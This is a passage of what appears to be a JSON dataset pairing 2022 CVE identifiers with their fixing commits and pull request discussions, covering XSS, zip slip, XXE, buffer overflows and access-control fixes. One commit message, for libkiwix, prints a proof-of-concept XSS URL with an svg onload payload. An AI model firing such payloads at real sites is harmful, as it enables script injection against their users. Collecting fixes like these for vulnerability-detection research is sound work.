[Codecov](https://codecov.io/gh/nextcloud/android/pull/10544?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) Report\n> Merging [#10544](https://codecov.io/gh/nextcloud/android/pull/10544?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (64ddaf4) into [master](https://codecov.io/gh/nextcloud/android/commit/f0bde3d588d527b684d2955152a87493f774105a?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (f0bde3d) will **decrease** coverage by `0.03%`.\n> The diff coverage is `26.02%`.\n\n```diff\n@@             Coverage Diff              @@\n##             master   #10544      +/-   ##\n============================================\n- Coverage     31.54%   31.50%   -0.04%     \n+ Complexity     3287     3280       -7     \n============================================\n  Files           540      540              \n  Lines         40209    40218       +9     \n  Branches       5557     5557              \n============================================\n- Hits          12683    12670      -13     \n- Misses        25616    25664      +48     \n+ Partials       1910     1884      -26     \n```\n\n\n\n| [Impacted Files](https://codecov.io/gh/nextcloud/android/pull/10544?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | Coverage \u0394 | |\n|---|---|---|\n| [.../owncloud/android/files/services/FileUploader.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvZmlsZXMvc2VydmljZXMvRmlsZVVwbG9hZGVyLmphdmE=) | `50.91% <\u00f8> (-3.12%)` | :arrow_down: |\n| [...roid/ui/activity/ReceiveExternalFilesActivity.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdWkvYWN0aXZpdHkvUmVjZWl2ZUV4dGVybmFsRmlsZXNBY3Rpdml0eS5qYXZh) | `0.35% <\u00f8> (\u00f8)` | |\n| [...ava/com/owncloud/android/ui/helpers/UriUploader.kt](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdWkvaGVscGVycy9VcmlVcGxvYWRlci5rdA==) | `26.02% <26.02%> (\u00f8)` | |\n| [...main/java/com/owncloud/android/utils/FileUtil.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdXRpbHMvRmlsZVV0aWwuamF2YQ==) | `60.00% <0.00%> (-26.67%)` | :arrow_down: |\n| [...om/owncloud/android/utils/ErrorMessageAdapter.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdXRpbHMvRXJyb3JNZXNzYWdlQWRhcHRlci5qYXZh) | `3.36% <0.00%> (-3.85%)` | :arrow_down: |\n| [.../owncloud/android/ui/adapter/OCFileListDelegate.kt](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdWkvYWRhcHRlci9PQ0ZpbGVMaXN0RGVsZWdhdGUua3Q=) | `49.63% <0.00%> (-1.46%)` | :arrow_down: |\n| [...a/com/owncloud/android/utils/FileStorageUtils.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvdXRpbHMvRmlsZVN0b3JhZ2VVdGlscy5qYXZh) | `54.77% <0.00%> (-1.11%)` | :arrow_down: |\n| [...loud/android/datamodel/ThumbnailsCacheManager.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL293bmNsb3VkL2FuZHJvaWQvZGF0YW1vZGVsL1RodW1ibmFpbHNDYWNoZU1hbmFnZXIuamF2YQ==) | `38.70% <0.00%> (-0.72%)` | :arrow_down: |\n| [...xtcloud/client/account/UserAccountManagerImpl.java](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-YXBwL3NyYy9tYWluL2phdmEvY29tL25leHRjbG91ZC9jbGllbnQvYWNjb3VudC9Vc2VyQWNjb3VudE1hbmFnZXJJbXBsLmphdmE=) | `71.62% <0.00%> (-0.68%)` | :arrow_down: |\n| ... and [7 more](https://codecov.io/gh/nextcloud/android/pull/10544/diff?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | |\n /backport to stable-3.21",
            "pr_title_words": 10,
            "comments_words": 212,
            "total_other_info_words": 222
        },
        {
            "cve-id": "CVE-2022-24301",
            "commit_url": "https://github.com/minetest/minetest/commit/3693b6871eba268ecc79b3f52d00d3cefe761131",
            "commit_msg": "Prevent players accessing inventories of other players (#10341)",
            "commit_msg_words": 8,
            "other_info": "Prevent players accessing inventories of other players Nice, that's another cheat from my hackclient patched (see #10340 ) Player inventories are only sent to the correct player. I see this is needed, but not how you'd get that inventory list in first place.\r\nEDIT: Drop and craft might also need the same guards. > Player inventories are only sent to the correct player. I see this is needed, but not how you'd get that inventory list in first place.\r\n\r\nYou don't need to have that list, you can guess where items are\r\n\r\nThis is a classic example of a Time of Check is not Time of Use vulnerability - the inventory owner is checked when sending inventories (kinda), but not on inventory actions My approval still stands Nice, the inventory exploit I found is patched. We'd be grateful for reports in the future, I know that's less fun :D > We'd be grateful for reports in the future, I know that's less fun :D\r\n\r\nI emailed a core dev about it instead of reporting it publicly because I didn't want somebody seeing the issue and wiping everyone's inventories on servers. But it seems the email wasn't noticed. Is there a way to report bugs privately that gets noticed? Talking to a core developer privately on IRC is another option, when you get a reply you can be sure your report was seen. Ah ok, thanks for that - we need to work on our communication https://github.com/minetest/minetest/security/policy\r\n\r\nThought that tab allowed in-Github reports, guess not Oh nice, you can draft the advisory privately and then publish it Needs to be done for detached inventorys as well.\r\n3d_armor has a workaround but they should be safe by the engine. > Needs to be done for detached inventorys as well.\r\n> 3d_armor has a workaround but they should be safe by the engine.\r\n\r\nImpossible. Detached inventories are meant to be accessible. Only mods can and have to implement meaningful restrictions, such as range or ownership. I'm referring to detached inventorys which were specifically meant for only one player. These are also only sent to this one.\r\nSure public detached inventorys should still be accessible. #11035",
            "pr_title_words": 7,
            "comments_words": 355,
            "total_other_info_words": 362
        },
        {
            "cve-id": "CVE-2022-29183",
            "commit_url": "https://github.com/gocd/gocd/commit/bda81084c0401234b168437cf35a63390e3064d1",
            "commit_msg": "Escape any HTML that happens to be inside an error message when rendering as HTML",
            "commit_msg_words": 15,
            "other_info": "Escape HTML in rendered error messages",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-39828",
            "commit_url": "https://github.com/Samsung/mTower/commit/b7dc202233026653c682c8fb4fe1251ca5056003",
            "commit_msg": "Fixed: lacking a check for the return value and NULL Pointer Dereference\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 16,
            "other_info": "Fixed: lacking a check for the return value and NULL Pointer Dereference",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2022-21144",
            "commit_url": "https://github.com/libxmljs/libxmljs/commit/2501807bde9b38cfaed06d1e140487516d91379d",
            "commit_msg": "Ensure parseXml/parseHtml input is string or buffer (#594)",
            "commit_msg_words": 8,
            "other_info": "Ensure parseXml/parseHtml input is string or buffer",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-2061",
            "commit_url": "https://github.com/hpjansson/chafa/commit/e6ce3746cdcf0836b9dae659a5aed15d73a080d8",
            "commit_msg": "libnsgif: fix oob in lzw_decode",
            "commit_msg_words": 5,
            "other_info": "Fix OOB access in `lzw_decode` Awesome, thanks a lot.",
            "pr_title_words": 5,
            "comments_words": 4,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-40674",
            "commit_url": "https://github.com/libexpat/libexpat/commit/4a32da87e931ba54393d465bb77c40b5c33d343b",
            "commit_msg": "Ensure raw tagnames are safe exiting internalEntityParser\n\nIt is possible to concoct a situation in which parsing is\nsuspended while substituting in an internal entity, so that\nXML_ResumeParser directly uses internalEntityProcessor as\nits processor.  If the subsequent parse includes some unclosed\ntags, this will return without calling storeRawNames to ensure\nthat the raw versions of the tag names are stored in memory other\nthan the parse buffer itself.  If the parse buffer is then changed\nor reallocated (for example if processing a file line by line),\nbadness will ensue.\n\nThis patch ensures storeRawNames is always called when needed\nafter calling doContent.  The earlier call do doContent does\nnot need the same protection; it only deals with entity\nsubstitution, which cannot leave unbalanced tags, and in any\ncase the raw names will be pointing into the stored entity\nvalue not the parse buffer.",
            "commit_msg_words": 142,
            "other_info": "[CVE-2022-40674] Ensure raw tagnames are safe exiting internalEntityParser",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-4583",
            "commit_url": "https://github.com/LEMS/jLEMS/commit/8c224637d7d561076364a9e3c2c375daeaf463dc",
            "commit_msg": "vuln-fix: Zip Slip Vulnerability\n\nThis fixes a Zip-Slip vulnerability.\n\nThis change does one of two things. This change either\n\n1. Inserts a guard to protect against Zip Slip.\nOR\n2. Replaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nFor number 2, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: High\nCVSSS: 7.4\nDetection: CodeQL (https://codeql.github.com/codeql-query-help/java/java-zipslip/) & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.ZipSlip)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/16\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 141,
            "other_info": "[SECURITY] Fix Zip Slip Vulnerability @pgleeson @tarelli : could you take a really quick look at this if you have a minute? (it's a really small change, and you touched the modified file most recently) @sanjayankur31 Yes, looks fine to me. Hi All,\n\nDo you believe this fixed a real security vulnerability? If so, do you need assistance with vulnerability disclosure? Thanks for this @JLLeitschuh. It is a useful extra check, but not a significant security vulnerability I believe.  Can you elaborate a bit more on this? I'm happy to agree with you, but I'd appreciate a little bit more contex around your assessment",
            "pr_title_words": 5,
            "comments_words": 99,
            "total_other_info_words": 104
        },
        {
            "cve-id": "CVE-2022-4361",
            "commit_url": "https://github.com/keycloak/keycloak/commit/a1cfe6e24e5b34792699a00b8b4a8016a5929e3a",
            "commit_msg": "Check the redirect URI is http(s) when used for a form Post (#22)\n\nCloses https://github.com/keycloak/security/issues/22\r\n\r\nCo-authored-by: Stian Thorgersen <stianst@gmail.com>",
            "commit_msg_words": 19,
            "other_info": "Release/21.1 ## Unreported flaky test detected\nIf the below flaky tests below are affected by the changes, please review and update the changes accordingly. Otherwise, a maintainer should report the flaky tests prior to merging the PR.\n\n### org.keycloak.testsuite.model.session.OfflineSessionPersistenceTest#testPersistenceMultipleNodesClientSessionsAtRandomNode\n\n[Keycloak CI - Store Model Tests](https://github.com/keycloak/keycloak/actions/runs/5393511114/jobs/9793662122)\n\n\n```\njava.lang.AssertionError: \nthreads didn't terminate in time: [main (TIMED_WAITING): locked on java.util.concurrent.FutureTask@475dc194 waiting for 93498 ms blocked for 0 ms\n\tat java.base@17.0.7/jdk.internal.misc.Unsafe.park(Native Method)\n\tat java.base@17.0.7/java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:252)\n\tat java.base@17.0.7/java.util.concurrent.FutureTask.awaitDone(FutureTask.java:444)\n...\n```\n[Report flaky test](https://github.com/keycloak/keycloak/issues/new?title=Flaky+test%3A+org.keycloak.testsuite.model.session.OfflineSessionPersistenceTest%23testPersistenceMultipleNodesClientSessionsAtRandomNode&labels=flaky-test%2Carea%2Fci%2Ckind%2Fbug&body=%23%23+org.keycloak.testsuite.model.session.OfflineSessionPersistenceTest%23testPersistenceMultipleNodesClientSessionsAtRandomNode%0A%5BKeycloak+CI+-+Store+Model+Tests%5D%28https%3A%2F%2Fgithub.com%2Fkeycloak%2Fkeycloak%2Factions%2Fruns%2F5393511114%2Fjobs%2F9793662122%29+%2F+%5BPull+Request+%2321269%5D%28https%3A%2F%2Fgithub.com%2Fkeycloak%2Fkeycloak%2Fpull%2F21269%29%0A%0A%60%60%60%0Ajava.lang.AssertionError%3A+%0Athreads+didn%27t+terminate+in+time%3A+%5Bmain+%28TIMED_WAITING%29%3A+locked+on+java.util.concurrent.FutureTask%40475dc194+waiting+for+93498+ms+blocked+for+0+ms%0A%09at+java.base%4017.0.7%2Fjdk.internal.misc.Unsafe.park%28Native+Method%29%0A%09at+java.base%4017.0.7%2Fjava.util.concurrent.locks.LockSupport.parkNanos%28LockSupport.java%3A252%29%0A%09at+java.base%4017.0.7%2Fjava.util.concurrent.FutureTask.awaitDone%28FutureTask.java%3A444%29%0A...%0A%60%60%60%0A)",
            "pr_title_words": 1,
            "comments_words": 76,
            "total_other_info_words": 77
        },
        {
            "cve-id": "CVE-2022-24976",
            "commit_url": "https://github.com/atheme/atheme/commit/4e664c75d0b280a052eb8b5e81aa41944e593c52",
            "commit_msg": "saslserv/main: Track EID we're pending login to\n\nThe existing model does not remember that we've sent a SVSLOGIN for a\ngiven SASL session, and simply assumes that if a client is introduced\nwith a SASL session open, that session must have succeeded. The security\nof this approach requires ircd to implicitly abort SASL sessions on\nclient registration.\n\nThis also means that if a client successfully authenticates and then\ndoes something else its pending login is forgotten about, even though a\nSVSLOGIN has been sent for it, and the ircd is going to think it's\nlogged in.\n\nThis change removes the dependency on ircd's state machine by keeping\nexplicit track of the pending login, i.e. the one we've most recently\nsent a SVSLOGIN for. The next commit will ensure that a client abort\n(even an implicit one) doesn't blow that information away.",
            "commit_msg_words": 141,
            "other_info": "Avoid login desyncs when SASL is aborted or interrupted pre-registration",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-27239",
            "commit_url": "https://github.com/piastry/cifs-utils/commit/955fb147e97a6a74e1aaa65766de91e2c1479765",
            "commit_msg": "CVE-2022-27239: mount.cifs: fix length check for ip option parsing\n\nPrevious check was true whatever the length of the input string was,\nleading to a buffer overflow in the subsequent strcpy call.\n\nBug: https://bugzilla.samba.org/show_bug.cgi?id=15025\n\nSigned-off-by: Jeffrey Bencteux <jbe@improsec.com>\nReviewed-by: David Disseldorp <ddiss@suse.de>",
            "commit_msg_words": 41,
            "other_info": "mount.cifs: two bug fixes Merged. Thanks!",
            "pr_title_words": 4,
            "comments_words": 2,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-2414",
            "commit_url": "https://github.com/dogtagpki/pki/commit/16deffdf7548e305507982e246eb9fd1eac414fd",
            "commit_msg": "Disable access to external entities when parsing XML\n\nThis reduces the vulnerability of XML parsers to XXE (XML external\nentity) injection.\n\nThe best way to prevent XXE is to stop using XML altogether, which we do\nplan to do. Until that happens I consider it worthwhile to tighten the\nsecurity here though.",
            "commit_msg_words": 52,
            "other_info": "Disable access to external entities when parsing XML I considered making a class similar to `JSONSerializer` but it felt like too much work for deprecated code, that is actively marked for removal. Therefore I just added in the necessary updates per-instantiation. It's a shame that Sonar doesn't work on PRs (yet) because then we could have checked that I caught them all. Thanks @edewata !",
            "pr_title_words": 8,
            "comments_words": 57,
            "total_other_info_words": 65
        },
        {
            "cve-id": "CVE-2022-28073",
            "commit_url": "https://github.com/radareorg/radare2/commit/59a9dfb60acf8b5c0312061cffd9693fc9526053",
            "commit_msg": "Fix uaf crash in aaft (tests_64927) ##crash\n\nReported by giantbranch of NSFOCUS TIANJI Lab",
            "commit_msg_words": 14,
            "other_info": "Soft fixes2 I want to know why you move this code's location, is there any difference?\r\n by convention all preconditions must be right in the first line after the function signature. are you commenting 3 year old commits because you are a bot? > are you commenting 3 year old commits because you are a bot?\r\n\r\nNo, I'm just working on vulnerability detection, so I want to know what meanings of this patch. Its unrelated to the bug",
            "pr_title_words": 2,
            "comments_words": 76,
            "total_other_info_words": 78
        },
        {
            "cve-id": "CVE-2022-36044",
            "commit_url": "https://github.com/rizinorg/rizin/commit/07b43bc8aa1ffebd9b68d60624c9610cf7e460c7",
            "commit_msg": "fix oob read on luac",
            "commit_msg_words": 5,
            "other_info": "Fix 2935 and 2936 @kobrineli i cannot reproduce the heap overflow after i have fixed the integer overflow, but please confirm it if you can. @wargio Can't reproduce issue #2935, but still can reproduce out of bounds on `memmove` from #2936 on the same input that I sent to you by email. > @wargio Can't reproduce issue #2935, but still can reproduce out of bounds on `memmove` from #2936 on the same input that I sent to you by email.\r\n\r\nI cannot\r\n![image](https://user-images.githubusercontent.com/561184/185769291-0e080668-7476-4579-9a23-e99d9392a66e.png)\r\n I have refactored bin_sym plugin since it was a bit messy and added some checks. try again with these changes. Your fix will be beneficial also for https://github.com/rizinorg/rizin/issues/297 @wargio Checked, now it works fine",
            "pr_title_words": 4,
            "comments_words": 113,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2022-35978",
            "commit_url": "https://github.com/minetest/minetest/commit/da71e86633d0b27cd02d7aac9fdac625d141ca13",
            "commit_msg": "Protect a few more settings from being set from mods\n\nOf those settings main_menu_script has concrete security impact, the rest are added out of abundance of caution.",
            "commit_msg_words": 27,
            "other_info": "[no squash] Random things, mostly fixes \"Immediately activate blocks when a player joins\"\r\n\r\nThis commit does not result in any noticeable change. Neither in singleplayer nor when joining an already started server. It always takes about 2 seconds from block render to entity loading. (using `dedicated_server_step = 0.08`)\r\n\r\n---\r\n\r\nOtherwise the commits look good, seem to work as expected. > his commit does not result in any noticeable change.\r\n\r\nYes. I tested it too and it seems to be quite random, probably dependent on disk speed.\r\nIn any case without this commit the world is _never_ loaded on time, while with it there is at least a possibility. Remembering the blocks to be activated is more complicated so I opted not to implement that. In that case, might it make sense to add a `TODO` comment to indicate partially the only working feature? That way it's not forgotten in the future to improve the reliability. Sure, done. [sfan5](https://github.com/sfan5), please, do look this error:\r\n\r\n[https://github.com/runsy/petz/issues/106#issuecomment-1154866867](https://github.com/runsy/petz/issues/106#issuecomment-1154866867)\r\n\r\nThe bug was when I do:\r\n\r\nself.object:set_hp(0) in an entity of already 0 or less hp.\r\n\r\nIt is as if now with the set_hp sentence the entity object is inmediately removed, when before this PR not.\r\n\r\nMy code was not sense, I know (I removed it that line and it works), but before this PR did not arise a crash, and it should not be.\r\n\r\n\r\n\r\n I think that is caused by this line:\r\n\r\nmarkForRemoval();\r\n\r\nThe entity is removed when set_hp = 0 but before this PR not. It was mandatory to use: self.object:remove() `get_hp()` should always return 0 in the death callback. However if you call `set_hp(0)` that immediately invalidates the object, this is indeed a behavioral change.\r\nI'll verify the former but other than that everything is in order. > `get_hp()` should always return 0 in the death callback. However if you call `set_hp(0)` that immediately invalidates the object, this is indeed a behavioral change. I'll verify the former but other than that everything is in order.\r\n\r\nI would just like to emphasize that this was not the case before this PR, at least not in the same step of the engine. After a set_hp line in a dead entity was possible still to work with the entity, probably only in that step.\r\n\r\nThis could(?) give failures in entity mods from 5.6 onwards. So I think a warning sign should be advertised.",
            "pr_title_words": 6,
            "comments_words": 391,
            "total_other_info_words": 397
        },
        {
            "cve-id": "CVE-2022-36039",
            "commit_url": "https://github.com/rizinorg/rizin/commit/1524f85211445e41506f98180f8f69f7bf115406",
            "commit_msg": "fix #2969 - oob write (1 byte) in dex.c",
            "commit_msg_words": 9,
            "other_info": "Fix multiple vulnerabilities @m4drat please check again from this branch. > @m4drat please check again from this branch.\r\n\r\nGot new crash, that was not reproducible on the previous branch (fix-multiple-vulns): https://github.com/rizinorg/rizin/issues/2966#issuecomment-1223903256",
            "pr_title_words": 3,
            "comments_words": 28,
            "total_other_info_words": 31
        },
        {
            "cve-id": "CVE-2022-38668",
            "commit_url": "https://github.com/CrowCpp/Crow/commit/d17a88af696b9de62504adf2a4657d381733b9e2",
            "commit_msg": "Fix stack data disclosure when returning static files smaller than\n16KiB. It could also cause to return partially incorrect file ending in\ncase of file not being rounded up to 16KiB.\n\nThanks to Gynvael Coldwind and hebi for discovering and preparing\nreport.",
            "commit_msg_words": 42,
            "other_info": "Fix stack data disclosure when returning static files smaller than 16KiB Is there a reason that the `buffers` vector is inside the loop? It was already implemented like this. It looks like `asio::write` expects vector of buffers. Also it looks like `asio::buffer` doesn't own memory (https://think-async.com/Asio/asio-1.22.1/doc/asio/reference/buffer.html#asio.reference.buffer.buffer_invalidation), so we have to:\r\n\r\n- send it buffers vector immediately with only one buffer and then use existing array to load next part of a file (current solution)\r\n\r\n- copy memory from array (or maybe load data directly to `asio::buffer`) with use of (I guess) `asio::buffer_copy` (https://think-async.com/Asio/asio-1.22.1/doc/asio/reference/buffer_copy.html) I'll leave it till tomorrow and then merge. Thanks! The vector with size 1 could be constructed outside the loop. And then the asio::buffer would be assigned to the first element in the vector inside the loop. Imo. No copy needed and we would save construction/destruction of a vector in a loop (probably alloc/dealloc) Good point. I didn't want to change anything not connected directly with error, but maybe postponing it is a worse idea :P ```diff\n--- include/crow/http_connection.h\t(before formatting)\n+++ include/crow/http_connection.h\t(after formatting)\n@@ -389,7 +389,7 @@\n             if (res.file_info.statResult == 0)\n             {\n                 std::ifstream is(res.file_info.path.c_str(), std::ios::in | std::ios::binary);\n-                std::vector<asio::const_buffer> buffers {1};\n+                std::vector<asio::const_buffer> buffers{1};\n                 char buf[16384];\n                 is.read(buf, sizeof(buf));\n                 while (is.gcount() > 0)\n```",
            "pr_title_words": 11,
            "comments_words": 197,
            "total_other_info_words": 208
        },
        {
            "cve-id": "CVE-2022-23645",
            "commit_url": "https://github.com/stefanberger/swtpm/commit/9f740868fc36761de27df3935513bdebf8852d19",
            "commit_msg": "swtpm: Check header size indicator against expected size (CID 375869)\n\nThis fix addresses Coverity issue CID 375869.\n\nCheck the header size indicated in the header of the state against the\nexpected size and return an error code in case the header size indicator\nis different. There was only one header size so far since blobheader was\nintroduced, so we don't need to deal with different sizes.\n\nWithout this fix a specially craft header could have cause out-of-bounds\naccesses on the byte array containing the swtpm's state.\n\nSigned-off-by: Stefan Berger <stefanb@linux.ibm.com>",
            "commit_msg_words": 90,
            "other_info": "Address issues detected by Coverity Scan ## Pull Request Test Coverage Report for [Build 3715](https://coveralls.io/builds/46616536)\n\n* **6** of **14**   **(42.86%)**  changed or added relevant lines in **2** files are covered.\n* **1** unchanged line in **1** file lost coverage.\n* Overall coverage decreased (**-0.06%**) to **74.866%**\n\n---\n\n|  Changes Missing Coverage | Covered Lines | Changed/Added Lines | % |\n| :-----|--------------|--------|---: |\n| [src/swtpm/swtpm_nvstore.c](https://coveralls.io/builds/46616536/source?filename=src%2Fswtpm%2Fswtpm_nvstore.c#L1106) | 3 | 5 | 60.0%\n| [src/swtpm_setup/swtpm.c](https://coveralls.io/builds/46616536/source?filename=src%2Fswtpm_setup%2Fswtpm.c#L548) | 3 | 9 | 33.33%\n<!-- | **Total:** | **6** | **14** | **42.86%** | -->\n\n|  Files with Coverage Reduction | New Missed Lines | % |\n| :-----|--------------|--: |\n| [src/swtpm_setup/swtpm.c](https://coveralls.io/builds/46616536/source?filename=src%2Fswtpm_setup%2Fswtpm.c#L559) | 1 | 80.56% |\n<!-- | **Total:** | **1** |  | -->\n\n|  Totals | [![Coverage Status](https://coveralls.io/builds/46616536/badge)](https://coveralls.io/builds/46616536) |\n| :-- | --: |\n| Change from base [Build 3691](https://coveralls.io/builds/44741236): |  -0.06% |\n| Covered Lines: | 6124 |\n| Relevant Lines: | 8180 |\n\n---\n##### \ud83d\udc9b  - [Coveralls](https://coveralls.io)",
            "pr_title_words": 6,
            "comments_words": 151,
            "total_other_info_words": 157
        },
        {
            "cve-id": "CVE-2022-27920",
            "commit_url": "https://github.com/kiwix/libkiwix/commit/8136138492ab51ae8a311be589b8b131d04125ce",
            "commit_msg": "use encoded URLs for searchSuggestionHtml\n\nPreviously, the seachURL was not encoded.\nThis resulted in an XSS vulnerability, a concept of proof is:\n\nstart kiwix-serve\nvisit - http://192.168.18.1:8081/\"><svg onload=\"alert(1)\">\nThis would display an alert message.\n\nThis encodes the searchURL before passing it to searchSuggestionHtml",
            "commit_msg_words": 43,
            "other_info": "Use encoded URLs for searchSuggestionHtml  # [Codecov](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix) Report\n> Merging [#721](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix) (04d6824) into [master](https://codecov.io/gh/kiwix/libkiwix/commit/e48b550b68c86bdfa678f1d833feda81c85a13bb?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix) (e48b550) will **not change** coverage.\n> The diff coverage is `100.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/kiwix/libkiwix/pull/721/graphs/tree.svg?width=650&height=150&src=pr&token=U6kdddwOoR&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix)](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix)\n\n```diff\n@@           Coverage Diff           @@\n##           master     #721   +/-   ##\n=======================================\n  Coverage   57.81%   57.81%           \n=======================================\n  Files          56       56           \n  Lines        3651     3651           \n  Branches     2047     2047           \n=======================================\n  Hits         2111     2111           \n  Misses       1539     1539           \n  Partials        1        1           \n```\n\n\n| [Impacted Files](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix) | Coverage \u0394 | |\n|---|---|---|\n| [src/server/internalServer.cpp](https://codecov.io/gh/kiwix/libkiwix/pull/721/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix#diff-c3JjL3NlcnZlci9pbnRlcm5hbFNlcnZlci5jcHA=) | `81.25% <100.00%> (\u00f8)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=footer&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix). Last update [e48b550...04d6824](https://codecov.io/gh/kiwix/libkiwix/pull/721?src=pr&el=lastupdated&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=kiwix).\n @juuz0 @kelson42 do we know what version the XSS vulnerability was introduced in? @legoktm I don't know, but I would guess for an old weakness https://github.com/kiwix/libkiwix/pull/465\r\nProbably this\r\nthe method added into this explicitly defines no escaping `{{{searchURL}}}` Thanks, so https://github.com/kiwix/libkiwix/commit/a59787002510a52171684487a10562d8d096c421 was only included in 10.0.0 (no released Debian versions are affected, just unstable).\r\n\r\nCould we do a 10.0.2 release with just this cherry-picked? I note that even library.kiwix.org is vulnerable to this. Or if 10.1.0 is coming pretty soon then waiting wouldn't be too bad.\r\n\r\nAnd we should also get a CVE ID assigned for this vulnerability, @kelson42 if you haven't gone through this 